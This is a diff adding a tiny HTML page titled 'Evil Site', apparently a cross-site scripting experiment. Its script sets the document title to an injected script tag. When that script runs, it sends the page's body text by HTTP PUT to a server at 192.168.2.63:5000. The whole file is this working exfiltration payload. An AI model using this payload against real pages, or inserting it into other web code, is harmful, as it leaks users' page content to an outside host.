@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+<script>
+    // console.log("333");
+    var evilTitle = '<script> var xhr = new XMLHttpRequest();var content = document.body.innerText;xhr.open(\'PUT\', \'http://192.168.2.63:5000\'+\'?\'+content, true);xhr.send();<\/script>';;
+    document.title=evilTitle;
+</script>
+
+
+
+</body>
+<h1> Evil Site</h1>
+233
+</html>
